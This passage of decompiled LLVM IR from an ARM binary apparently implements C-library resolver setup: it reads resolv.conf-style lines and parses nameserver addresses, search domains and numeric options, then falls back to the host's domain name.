  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1dd6c, label %dec_label_pc_1de28

dec_label_pc_1dd6c:                               ; preds = %dec_label_pc_1dd40
  %v0_1dd6c = load i32, i32* @r7, align 4
  store i32 %v0_1dd6c, i32* %r0.global-to-local, align 4
  %v0_1dd70 = call i32 @skip_nospace()
  %v1_1dd70 = inttoptr i32 %v0_1dd70 to i8*
  store i32 %v2_1dd74, i32* @r4, align 4
  %v0_1dd78 = load i32, i32* @r6, align 4
  %v1_1dd78 = trunc i32 %v0_1dd78 to i8
  store i8 %v1_1dd78, i8* %v1_1dd70, align 1
  %v0_1dd7c = load i32, i32* @r6, align 4
  store i32 %v0_1dd7c, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_1dd74, i32* %r0.global-to-local, align 4
  %v3_1dd88 = call i32 @__GI_memset(i8* %v2_1dd88, i32 %v0_1dd7c)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1dd90 = load i32, i32* @r7, align 4
  store i32 %v0_1dd90, i32* %r1.global-to-local, align 4
  store i32 %v2_1dd94, i32* %r2.global-to-local, align 4
  %v3_1dd98 = inttoptr i32 %v0_1dd90 to i8*
  %v4_1dd98 = call i32 @inet_pton(i32 10, i8* %v3_1dd98, i32 %v2_1dd94)
  store i32 %v4_1dd98, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_1dd98, 1
  br i1 %tmp59, label %dec_label_pc_1dda8, label %dec_label_pc_1ddc4

dec_label_pc_1dda8:                               ; preds = %dec_label_pc_1dd6c
  %v0_1dda8 = load i32, i32* @r7, align 4
  store i32 %v0_1dda8, i32* %r1.global-to-local, align 4
  store i32 %v2_1ddac, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1ddb4 = inttoptr i32 %v0_1dda8 to i8*
  %v4_1ddb4 = call i32 @inet_pton(i32 2, i8* %v3_1ddb4, i32 %v2_1ddac)
  store i32 %v4_1ddb4, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_1ddb4, 1
  br i1 %tmp60, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1ddc4

dec_label_pc_1ddc4:                               ; preds = %dec_label_pc_1dda8, %dec_label_pc_1dd6c
  %v0_1ddc8.off0 = phi i16 [ 10, %dec_label_pc_1dd6c ], [ 2, %dec_label_pc_1dda8 ]
  store i32 %v2_1ddc4, i32* %r2.global-to-local, align 4
  store i16 %v0_1ddc8.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 27404, i32* @r7, align 4
  %v0_1ddd8 = load i32, i32* @r5, align 4
  %v2_1ddd8 = add i32 %v0_1ddd8, 27404
  %v3_1ddd8 = inttoptr i32 %v2_1ddd8 to i32*
  %v4_1ddd8 = load i32, i32* %v3_1ddd8, align 4
  store i32 27400, i32* @sl, align 4
  %v1_1dde0 = add i32 %v4_1ddd8, 1
  store i32 %v1_1dde0, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1dde8 = mul i32 %v1_1dde0, 28
  store i32 %v2_1dde8, i32* %r1.global-to-local, align 4
  %v2_1ddec = add i32 %v0_1ddd8, 27400
  %v3_1ddec = inttoptr i32 %v2_1ddec to i32*
  %v4_1ddec = load i32, i32* %v3_1ddec, align 4
  store i32 %v4_1ddec, i32* %r0.global-to-local, align 4
  %v2_1ddf0 = inttoptr i32 %v4_1ddec to i32*
  %v3_1ddf0 = call i32 @realloc(i32* %v2_1ddf0, i32 %v2_1dde8)
  store i32 %v3_1ddf0, i32* %r0.global-to-local, align 4
  store i32 %v3_1ddf0, i32* @r6, align 4
  %v2_1ddf4 = icmp eq i32 %v3_1ddf0, 0
  br i1 %v2_1ddf4, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1ddfc

dec_label_pc_1ddfc:                               ; preds = %dec_label_pc_1ddc4
  %v0_1ddfc = load i32, i32* @r5, align 4
  %v1_1ddfc = load i32, i32* @r7, align 4
  %v2_1ddfc = add i32 %v1_1ddfc, %v0_1ddfc
  %v3_1ddfc = inttoptr i32 %v2_1ddfc to i32*
  %v4_1ddfc = load i32, i32* %v3_1ddfc, align 4
  store i32 %v4_1ddfc, i32* %r4.global-to-local, align 4
  %v1_1de00 = load i32, i32* @r8, align 4
  %v3_1de00 = mul i32 %v1_1de00, %v4_1ddfc
  %v4_1de00 = add i32 %v3_1de00, %v3_1ddf0
  store i32 %v4_1de00, i32* %lr.global-to-local, align 4
  %v2_1de08 = load i16, i16* %stack_var_-68, align 2
  %v3_1de08 = sext i16 %v2_1de08 to i32
  store i32 %v3_1de08, i32* %r0.global-to-local, align 4
  %v6_1de08 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1de08, i32* %r1.global-to-local, align 4
  %v9_1de08 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1de08, i32* %r2.global-to-local, align 4
  store i32 %v14_1de08, i32* @ip, align 4
  %v2_1de0c = load i32, i32* @sl, align 4
  %v3_1de0c = add i32 %v2_1de0c, %v0_1ddfc
  %v4_1de0c = inttoptr i32 %v3_1de0c to i32*
  store i32 %v3_1ddf0, i32* %v4_1de0c, align 4
  %v0_1de10 = load i32, i32* %lr.global-to-local, align 4
  %v1_1de10 = inttoptr i32 %v0_1de10 to i32*
  %v2_1de10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1de10, i32* %v1_1de10, align 4
  %v3_1de10 = add i32 %v0_1de10, 4
  %v4_1de10 = inttoptr i32 %v3_1de10 to i32*
  %v5_1de10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1de10, i32* %v4_1de10, align 4
  %v6_1de10 = add i32 %v0_1de10, 8
  %v7_1de10 = inttoptr i32 %v6_1de10 to i32*
  %v8_1de10 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1de10, i32* %v7_1de10, align 4
  %v9_1de10 = add i32 %v0_1de10, 12
  %v10_1de10 = inttoptr i32 %v9_1de10 to i32*
  %v11_1de10 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1de10, i32* %v10_1de10, align 4
  %v12_1de10 = add i32 %v0_1de10, 16
  store i32 %v12_1de10, i32* @lr, align 4
  %v2_1de14 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_1de14, i32* %r0.global-to-local, align 4
  %v0_1de18 = load i32, i32* %r4.global-to-local, align 4
  %v1_1de18 = add i32 %v0_1de18, 1
  store i32 %v1_1de18, i32* %r4.global-to-local, align 4
  %v1_1de1c = inttoptr i32 %v12_1de10 to i32*
  store i32 %v2_1de14, i32* %v1_1de1c, align 4
  %v3_1de1c = add i32 %v0_1de10, 20
  %v4_1de1c = inttoptr i32 %v3_1de1c to i32*
  %v5_1de1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1de1c, i32* %v4_1de1c, align 4
  %v6_1de1c = add i32 %v0_1de10, 24
  %v7_1de1c = inttoptr i32 %v6_1de1c to i32*
  %v8_1de1c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1de1c, i32* %v7_1de1c, align 4
  %v0_1de20 = load i32, i32* %r4.global-to-local, align 4
  %v1_1de20 = load i32, i32* @r5, align 4
  %v2_1de20 = load i32, i32* @r7, align 4
  %v3_1de20 = add i32 %v2_1de20, %v1_1de20
  %v4_1de20 = inttoptr i32 %v3_1de20 to i32*
  store i32 %v0_1de20, i32* %v4_1de20, align 4
  br label %dec_label_pc_1df9c.backedge

dec_label_pc_1df9c.backedge:                      ; preds = %dec_label_pc_1dec4, %dec_label_pc_1deb4, %dec_label_pc_1de80, %dec_label_pc_1ddfc, %dec_label_pc_1df54, %dec_label_pc_1dda8, %dec_label_pc_1ddc4, %dec_label_pc_1defc, %dec_label_pc_1df04, %dec_label_pc_1dee8, %dec_label_pc_1df38
  %v0_1dfa8.pre = load i32, i32* @fp, align 4
  store i32 %v2_1df9c, i32* @r4, align 4
  store i32 %v2_1df9c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1dfa8.pre, i32* %r2.global-to-local, align 4
  %v3_1dfac = call i32 @fgets(i32 %v2_1df9c, i32 128, i32 %v0_1dfa8.pre)
  store i32 %v3_1dfac, i32* %r0.global-to-local, align 4
  %v2_1dfb0 = icmp eq i32 %v3_1dfac, 0
  br i1 %v2_1dfb0, label %dec_label_pc_1dfb8, label %dec_label_pc_1dd40

dec_label_pc_1de28:                               ; preds = %dec_label_pc_1dd40
  %v0_1de28 = load i32, i32* @r4, align 4
  store i32 %v0_1de28, i32* %r0.global-to-local, align 4
  store i32 %v2_1df78, i32* @r1, align 4
  %v2_1de30 = inttoptr i32 %v0_1de28 to i8*
  %v3_1de30 = call i32 @__GI_strcoll(i8* %v2_1de30, i32 %v2_1df78)
  store i32 %v3_1de30, i32* %r0.global-to-local, align 4
  %v2_1de34 = icmp eq i32 %v3_1de30, 0
  br i1 %v2_1de34, label %dec_label_pc_1de68, label %dec_label_pc_1de3c

dec_label_pc_1de3c:                               ; preds = %dec_label_pc_1de28
  %v0_1de3c = load i32, i32* @r4, align 4
  store i32 %v0_1de3c, i32* %r0.global-to-local, align 4
  store i32 %v2_1df84, i32* @r1, align 4
  %v2_1de44 = inttoptr i32 %v0_1de3c to i8*
  %v3_1de44 = call i32 @__GI_strcoll(i8* %v2_1de44, i32 %v2_1df84)
  store i32 %v3_1de44, i32* %r0.global-to-local, align 4
  %v2_1de48 = icmp eq i32 %v3_1de44, 0
  br i1 %v2_1de48, label %dec_label_pc_1de68, label %dec_label_pc_1dee8

dec_label_pc_1de54:                               ; preds = %dec_label_pc_1de68, %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge
  %v2_1de58 = phi i32 [ %v1_1de6c, %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge ], [ %v1_1de6c10, %dec_label_pc_1de68 ]
  %v0_1de58 = phi i32 [ %v1_1de74, %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge ], [ %v1_1de7417, %dec_label_pc_1de68 ]
  %v1_1de54 = phi i32 [ %v1_1de54.pre, %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge ], [ 27396, %dec_label_pc_1de68 ]
  %v1_1de58 = phi i32 [ %v0_1de6c, %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge ], [ %v0_1de6c9, %dec_label_pc_1de68 ]
  %v2_1de54 = add i32 %v1_1de58, %v1_1de54
  %v3_1de54 = inttoptr i32 %v2_1de54 to i32*
  %v4_1de54 = load i32, i32* %v3_1de54, align 4
  store i32 %v4_1de54, i32* %r3.global-to-local, align 4
  %v3_1de58 = add i32 %v1_1de58, %v2_1de58
  %v4_1de58 = inttoptr i32 %v3_1de58 to i32*
  store i32 %v0_1de58, i32* %v4_1de58, align 4
  %v0_1de5c = load i32, i32* %r3.global-to-local, align 4
  %v1_1de5c = load i32, i32* %r2.global-to-local, align 4
  %v4_1de5c = mul i32 %v1_1de5c, 4
  %v5_1de5c = add i32 %v4_1de5c, %v0_1de5c
  %v6_1de5c = inttoptr i32 %v5_1de5c to i32*
  %v7_1de5c = load i32, i32* %v6_1de5c, align 4
  store i32 %v7_1de5c, i32* @r0, align 4
  %v0_1de60 = call i32 @free()
  store i32 %v0_1de60, i32* %r0.global-to-local, align 4
  %v0_1de6c = load i32, i32* @r5, align 4
  %v1_1de6c = load i32, i32* @sb, align 4
  %v2_1de6c = add i32 %v1_1de6c, %v0_1de6c
  %v3_1de6c = inttoptr i32 %v2_1de6c to i32*
  %v4_1de6c = load i32, i32* %v3_1de6c, align 4
  store i32 %v4_1de6c, i32* %r3.global-to-local, align 4
  %v2_1de70 = icmp eq i32 %v4_1de6c, 0
  %v1_1de74 = add i32 %v4_1de6c, -1
  store i32 %v1_1de74, i32* %r2.global-to-local, align 4
  br i1 %v2_1de70, label %dec_label_pc_1de7c, label %dec_label_pc_1de54.dec_label_pc_1de54_crit_edge

dec_label_pc_1de54.dec_label_pc_1de54_crit_edge:  ; preds = %dec_label_pc_1de54
  %v1_1de54.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1de54

dec_label_pc_1de68:                               ; preds = %dec_label_pc_1de3c, %dec_label_pc_1de28
  store i32 27396, i32* @r4, align 4
  %v0_1de6c9 = load i32, i32* @r5, align 4
  %v1_1de6c10 = load i32, i32* @sb, align 4
  %v2_1de6c11 = add i32 %v1_1de6c10, %v0_1de6c9
  %v3_1de6c12 = inttoptr i32 %v2_1de6c11 to i32*
  %v4_1de6c13 = load i32, i32* %v3_1de6c12, align 4
  store i32 %v4_1de6c13, i32* %r3.global-to-local, align 4
  %v2_1de7015 = icmp eq i32 %v4_1de6c13, 0
  %v1_1de7417 = add i32 %v4_1de6c13, -1
  store i32 %v1_1de7417, i32* %r2.global-to-local, align 4
  br i1 %v2_1de7015, label %dec_label_pc_1de7c, label %dec_label_pc_1de54

dec_label_pc_1de7c:                               ; preds = %dec_label_pc_1de54, %dec_label_pc_1de68
  store i32 27396, i32* @r6, align 4
  br label %dec_label_pc_1de80

dec_label_pc_1de80:                               ; preds = %dec_label_pc_1dec4, %dec_label_pc_1de7c
  %v0_1de80 = load i32, i32* @r7, align 4
  store i32 %v0_1de80, i32* %r0.global-to-local, align 4
  %v0_1de84 = call i32 @skip_nospace()
  store i32 %v0_1de84, i32* %r0.global-to-local, align 4
  %v1_1de88 = inttoptr i32 %v0_1de84 to i8*
  %v2_1de88 = call i32 @skip_and_NUL_space(i8* %v1_1de88)
  store i32 %v2_1de88, i32* %r0.global-to-local, align 4
  %v0_1de8c = load i32, i32* @r5, align 4
  %v1_1de8c = load i32, i32* @sb, align 4
  %v2_1de8c = add i32 %v1_1de8c, %v0_1de8c
  %v3_1de8c = inttoptr i32 %v2_1de8c to i32*
  %v4_1de8c = load i32, i32* %v3_1de8c, align 4
  store i32 %v2_1de88, i32* @r4, align 4
  %tmp69 = mul i32 %v4_1de8c, 4
  %v3_1de98 = add i32 %tmp69, 4
  store i32 %v3_1de98, i32* %r1.global-to-local, align 4
  %v1_1de9c = load i32, i32* @r6, align 4
  %v2_1de9c = add i32 %v1_1de9c, %v0_1de8c
  %v3_1de9c = inttoptr i32 %v2_1de9c to i32*
  %v4_1de9c = load i32, i32* %v3_1de9c, align 4
  store i32 %v4_1de9c, i32* %r0.global-to-local, align 4
  %v2_1dea0 = inttoptr i32 %v4_1de9c to i32*
  %v3_1dea0 = call i32 @realloc(i32* %v2_1dea0, i32 %v3_1de98)
  store i32 %v3_1dea0, i32* %r3.global-to-local, align 4
  %v2_1dea4 = icmp eq i32 %v3_1dea0, 0
  %v0_1dea8 = load i32, i32* @r7, align 4
  store i32 %v0_1dea8, i32* %r0.global-to-local, align 4
  %v0_1deac = load i32, i32* @r4, align 4
  store i32 %v0_1deac, i32* @r7, align 4
  br i1 %v2_1dea4, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1deb4

dec_label_pc_1deb4:                               ; preds = %dec_label_pc_1de80
  %v1_1deb4 = load i32, i32* @r5, align 4
  %v2_1deb4 = load i32, i32* @r6, align 4
  %v3_1deb4 = add i32 %v2_1deb4, %v1_1deb4
  %v4_1deb4 = inttoptr i32 %v3_1deb4 to i32*
  store i32 %v3_1dea0, i32* %v4_1deb4, align 4
  %v1_1deb8 = inttoptr i32 %v0_1dea8 to i8*
  %v2_1deb8 = call i32 @__GI_strdup(i8* %v1_1deb8)
  store i32 %v2_1deb8, i32* %r0.global-to-local, align 4
  %v2_1debc = icmp eq i32 %v2_1deb8, 0
  br i1 %v2_1debc, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1dec4

dec_label_pc_1dec4:                               ; preds = %dec_label_pc_1deb4
  %v0_1dec4 = load i32, i32* @r5, align 4
  %v1_1dec4 = load i32, i32* @sb, align 4
  %v2_1dec4 = add i32 %v1_1dec4, %v0_1dec4
  %v3_1dec4 = inttoptr i32 %v2_1dec4 to i32*
  %v4_1dec4 = load i32, i32* %v3_1dec4, align 4
  store i32 %v4_1dec4, i32* %r3.global-to-local, align 4
  %v1_1dec8 = load i32, i32* @r6, align 4
  %v2_1dec8 = add i32 %v1_1dec8, %v0_1dec4
  %v3_1dec8 = inttoptr i32 %v2_1dec8 to i32*
  %v4_1dec8 = load i32, i32* %v3_1dec8, align 4
  store i32 %v4_1dec8, i32* %r2.global-to-local, align 4
  %v1_1decc = add i32 %v4_1dec4, 1
  store i32 %v1_1decc, i32* %r1.global-to-local, align 4
  %v5_1ded0 = mul i32 %v4_1dec4, 4
  %v6_1ded0 = add i32 %v4_1dec8, %v5_1ded0
  %v7_1ded0 = inttoptr i32 %v6_1ded0 to i32*
  store i32 %v2_1deb8, i32* %v7_1ded0, align 4
  %v0_1ded4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ded4 = load i32, i32* @r5, align 4
  %v2_1ded4 = load i32, i32* @sb, align 4
  %v3_1ded4 = add i32 %v2_1ded4, %v1_1ded4
  %v4_1ded4 = inttoptr i32 %v3_1ded4 to i32*
  store i32 %v0_1ded4, i32* %v4_1ded4, align 4
  %v0_1ded8 = load i32, i32* @r4, align 4
  %v1_1ded8 = inttoptr i32 %v0_1ded8 to i8*
  %v2_1ded8 = load i8, i8* %v1_1ded8, align 1
  %v3_1ded8 = zext i8 %v2_1ded8 to i32
  store i32 %v3_1ded8, i32* %r3.global-to-local, align 4
  %v2_1dedc = icmp eq i8 %v2_1ded8, 0
  br i1 %v2_1dedc, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1de80

dec_label_pc_1dee8:                               ; preds = %dec_label_pc_1de3c
  %v0_1dee8 = load i32, i32* @r4, align 4
  store i32 %v0_1dee8, i32* %r0.global-to-local, align 4
  %v2_1deec = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1deec, i32* @r1, align 4
  %v2_1def0 = inttoptr i32 %v0_1dee8 to i8*
  %v3_1def0 = call i32 @__GI_strcoll(i8* %v2_1def0, i32 %v2_1deec)
  store i32 %v3_1def0, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1def0, 16777216
  %v1_1def4 = sdiv i32 %sext2, 16777216
  store i32 %v1_1def4, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1defc, label %dec_label_pc_1df9c.backedge

dec_label_pc_1defc:                               ; preds = %dec_label_pc_1dee8
  %v0_1defc = load i32, i32* @r7, align 4
  %v2_1defc = icmp eq i32 %v0_1defc, 0
  br i1 %v2_1defc, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1df04

dec_label_pc_1df04:                               ; preds = %dec_label_pc_1defc
  store i32 %v0_1defc, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1df0c = call i32 @__GI_strchr(i32 %v0_1defc, i32 58)
  store i32 %v2_1df0c, i32* %r0.global-to-local, align 4
  store i32 %v2_1df0c, i32* @r6, align 4
  %v3_1df10 = icmp eq i32 %v2_1df0c, 0
  br i1 %v3_1df10, label %dec_label_pc_1df9c.backedge, label %dec_label_pc_1df18

dec_label_pc_1df18:                               ; preds = %dec_label_pc_1df04
  store i32 -33300, i32* %r1.global-to-local, align 4
  %v0_1df1c = load i32, i32* @r4, align 4
  %v1_1df1c = trunc i32 %v0_1df1c to i8
  %v3_1df1c = inttoptr i32 %v2_1df0c to i8*
  store i8 %v1_1df1c, i8* %v3_1df1c, align 1
  %v0_1df20 = load i32, i32* @r5, align 4
  %v1_1df20 = load i32, i32* %r1.global-to-local, align 4
  %v2_1df20 = add i32 %v1_1df20, %v0_1df20
  store i32 %v2_1df20, i32* @r1, align 4
  %v0_1df24 = load i32, i32* @r7, align 4
  store i32 %v0_1df24, i32* %r0.global-to-local, align 4
  %v2_1df28 = inttoptr i32 %v0_1df24 to i8*
  %v3_1df28 = call i32 @__GI_strcoll(i8* %v2_1df28, i32 %v2_1df20)
  store i32 %v3_1df28, i32* %r0.global-to-local, align 4
  %v2_1df2c = icmp eq i32 %v3_1df28, 0
  br i1 %v2_1df2c, label %dec_label_pc_1df54, label %dec_label_pc_1df38

dec_label_pc_1df38:                               ; preds = %dec_label_pc_1df18
  %v0_1df3c = load i32, i32* @r7, align 4
  store i32 %v0_1df3c, i32* %r0.global-to-local, align 4
  %v0_1df40 = load i32, i32* @r5, align 4
  %v2_1df40 = add i32 %v0_1df40, -33292
  store i32 %v2_1df40, i32* @r1, align 4
  %v2_1df44 = inttoptr i32 %v0_1df3c to i8*
  %v3_1df44 = call i32 @__GI_strcoll(i8* %v2_1df44, i32 %v2_1df40)
  store i32 %v3_1df44, i32* %r0.global-to-local, align 4
  %v2_1df48 = icmp eq i32 %v3_1df44, 0
  br i1 %v2_1df48, label %dec_label_pc_1df54, label %dec_label_pc_1df9c.backedge

dec_label_pc_1df54:                               ; preds = %dec_label_pc_1df38, %dec_label_pc_1df18
  %storemerge = phi i32 [ 1178, %dec_label_pc_1df18 ], [ 1179, %dec_label_pc_1df38 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1df54 = load i32, i32* @r6, align 4
  %v1_1df54 = add i32 %v0_1df54, 1
  store i32 %v1_1df54, i32* @r0, align 4
  %v0_1df58 = load i32, i32* @r5, align 4
  %v2_1df58 = add i32 %v0_1df58, %storemerge
  store i32 %v2_1df58, i32* @r4, align 4
  %v1_1df5c = call i32 @atol(i32 %v1_1df54)
  %v2_1df5c = trunc i32 %v1_1df5c to i8
  store i32 %v1_1df5c, i32* %r0.global-to-local, align 4
  %v3_1df60 = load i32, i32* @r4, align 4
  %v4_1df60 = inttoptr i32 %v3_1df60 to i8*
  store i8 %v2_1df5c, i8* %v4_1df60, align 1
  br label %dec_label_pc_1df9c.backedge

dec_label_pc_1df68:                               ; preds = %dec_label_pc_1dd08
  %v0_1df6c = load i32, i32* @r5, align 4
  %v2_1df6c = add i32 %v0_1df6c, -33336
  %v2_1df78 = add i32 %v0_1df6c, -33324
  %v2_1df84 = add i32 %v0_1df6c, -33316
  %v2_1df90 = add i32 %v0_1df6c, -33308
  store i32 %v2_1df90, i32* %r3.global-to-local, align 4
  store i32 27408, i32* @sb, align 4
  store i32 %v2_1df90, i32* %stack_var_-560, align 4
  %v2_1df9c = ptrtoint i32* %stack_var_-288 to i32
  %v1_1dd44 = bitcast i32* %stack_var_-288 to i8*
  %v2_1dd74 = ptrtoint i16* %stack_var_-68 to i32
  %v2_1dd88 = bitcast i16* %stack_var_-68 to i8*
  %v2_1dd94 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1ddac = ptrtoint i32* %stack_var_-64 to i32
  %v2_1ddc4 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1de08 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1df9c, i32* @r4, align 4
  store i32 %v2_1df9c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_1dd30, i32* %r2.global-to-local, align 4
  %v3_1dfac66 = call i32 @fgets(i32 %v2_1df9c, i32 128, i32 %v5_1dd30)
  store i32 %v3_1dfac66, i32* %r0.global-to-local, align 4
  %v2_1dfb068 = icmp eq i32 %v3_1dfac66, 0
  br i1 %v2_1dfb068, label %dec_label_pc_1dfb8, label %dec_label_pc_1dd40

dec_label_pc_1dfb8:                               ; preds = %dec_label_pc_1df9c.backedge, %dec_label_pc_1df68
  %v0_1dfb8 = load i32, i32* @fp, align 4
  store i32 %v0_1dfb8, i32* %r0.global-to-local, align 4
  %v1_1dfbc = inttoptr i32 %v0_1dfb8 to i16*
  %v2_1dfbc = call i32 @__GI_fclose(i16* %v1_1dfbc)
  store i32 %v2_1dfbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dfc0

dec_label_pc_1dfc0:                               ; preds = %dec_label_pc_1dd08, %dec_label_pc_1dfb8
  store i32 27404, i32* %r3.global-to-local, align 4
  %v0_1dfc4 = load i32, i32* @r5, align 4
  %v2_1dfc4 = add i32 %v0_1dfc4, 27404
  %v3_1dfc4 = inttoptr i32 %v2_1dfc4 to i32*
  %v4_1dfc4 = load i32, i32* %v3_1dfc4, align 4
  store i32 %v4_1dfc4, i32* %r3.global-to-local, align 4
  %v2_1dfc8 = icmp eq i32 %v4_1dfc4, 0
  br i1 %v2_1dfc8, label %dec_label_pc_1dfd0, label %dec_label_pc_1e00c

dec_label_pc_1dfd0:                               ; preds = %dec_label_pc_1dfc0
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1dfd4 = call i32 @malloc(i32 28)
  store i32 %v1_1dfd4, i32* %r0.global-to-local, align 4
  store i32 -33280, i32* %r3.global-to-local, align 4
  store i32 27400, i32* %r2.global-to-local, align 4
  %v2_1dfe0 = icmp eq i32 %v1_1dfd4, 0
  %v1_1dfe4 = load i32, i32* @r5, align 4
  br i1 %v2_1dfe0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1dfd0
  %v3_1dfe4 = add i32 %v1_1dfe4, -33280
  store i32 %v3_1dfe4, i32* %r3.global-to-local, align 4
  %v3_1dfe828 = add i32 %v1_1dfe4, 27400
  %v4_1dfe829 = inttoptr i32 %v3_1dfe828 to i32*
  store i32 0, i32* %v4_1dfe829, align 4
  %v1_1dfec = load i32, i32* %r3.global-to-local, align 4
  %v2_1dfec = load i32, i32* @r5, align 4
  %v3_1dfec = load i32, i32* %r2.global-to-local, align 4
  %v4_1dfec = add i32 %v3_1dfec, %v2_1dfec
  %v5_1dfec = inttoptr i32 %v4_1dfec to i32*
  store i32 %v1_1dfec, i32* %v5_1dfec, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1dfd0
  %v3_1dfe8 = add i32 %v1_1dfe4, 27400
  %v4_1dfe8 = inttoptr i32 %v3_1dfe8 to i32*
  store i32 %v1_1dfd4, i32* %v4_1dfe8, align 4
  %v1_1dff0 = load i32, i32* @r5, align 4
  %v2_1dff0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1dff0 = add i32 %v2_1dff0, %v1_1dff0
  store i32 %v3_1dff0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 122876, i32* @lr, align 4
  %v1_1dff8 = xor i1 %v2_1dfe0, true
  call void @__pseudo_cond_branch(i1 %v1_1dff8, i32 ptrtoint (i32* @global_var_15a50.1513 to i32))
  store i32 27404, i32* %r2.global-to-local, align 4
  %v0_1e000 = load i32, i32* @r5, align 4
  %v2_1e000 = add i32 %v0_1e000, 27404
  %v3_1e000 = inttoptr i32 %v2_1e000 to i32*
  %v4_1e000 = load i32, i32* %v3_1e000, align 4
  %v1_1e004 = add i32 %v4_1e000, 1
  store i32 %v1_1e004, i32* %r3.global-to-local, align 4
  store i32 %v1_1e004, i32* %v3_1e000, align 4
  %v0_1e010.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e00c

dec_label_pc_1e00c:                               ; preds = %dec_label_pc_1dfc0, %.thread4
  %v0_1e010 = phi i32 [ %v0_1dfc4, %dec_label_pc_1dfc0 ], [ %v0_1e010.pre, %.thread4 ]
  store i32 27408, i32* @r7, align 4
  %v2_1e010 = add i32 %v0_1e010, 27408
  %v3_1e010 = inttoptr i32 %v2_1e010 to i32*
  %v4_1e010 = load i32, i32* %v3_1e010, align 4
  store i32 %v4_1e010, i32* @r4, align 4
  %v2_1e014 = icmp eq i32 %v4_1e010, 0
  br i1 %v2_1e014, label %dec_label_pc_1e01c, label %dec_label_pc_1e09c

dec_label_pc_1e01c:                               ; preds = %dec_label_pc_1e00c
  %v2_1e01c = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1e01c, i32* @r6, align 4
  store i32 %v2_1e01c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1e028 = call i32 @__GI_gethostname(i32 %v2_1e01c, i32 255)
  store i32 %v2_1e028, i32* %r0.global-to-local, align 4
  %v2_1e02c = icmp eq i32 %v2_1e028, 0
  br i1 %v2_1e02c, label %dec_label_pc_1e038, label %dec_label_pc_1e09c

dec_label_pc_1e038:                               ; preds = %dec_label_pc_1e01c
  store i32 %v2_1e01c, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1e040 = call i32 @__GI_strchr(i32 %v2_1e01c, i32 46)
  store i32 %v2_1e040, i32* %r0.global-to-local, align 4
  %v2_1e044 = icmp eq i32 %v2_1e040, 0
  br i1 %v2_1e044, label %dec_label_pc_1e09c, label %dec_label_pc_1e04c

dec_label_pc_1e04c:                               ; preds = %dec_label_pc_1e038
  %v1_1e04c = add i32 %v2_1e040, 1
  %v2_1e04c = inttoptr i32 %v1_1e04c to i8*
  %v3_1e04c = load i8, i8* %v2_1e04c, align 1
  %v4_1e04c = zext i8 %v3_1e04c to i32
  store i32 %v4_1e04c, i32* %r3.global-to-local, align 4
  %v2_1e050 = icmp eq i8 %v3_1e04c, 0
  store i32 %v1_1e04c, i32* %r0.global-to-local, align 4
  br i1 %v2_1e050, label %dec_label_pc_1e09c, label %dec_label_pc_1e05c

dec_label_pc_1e05c:                               ; preds = %dec_label_pc_1e04c
  %v2_1e05c = call i32 @__GI_strdup(i8* %v2_1e04c)
  store i32 %v2_1e05c, i32* %r0.global-to-local, align 4
  store i32 %v2_1e05c, i32* @r4, align 4
  %v2_1e060 = icmp eq i32 %v2_1e05c, 0
  br i1 %v2_1e060, label %dec_label_pc_1e09c, label %dec_label_pc_1e068

dec_label_pc_1e068:                               ; preds = %dec_label_pc_1e05c
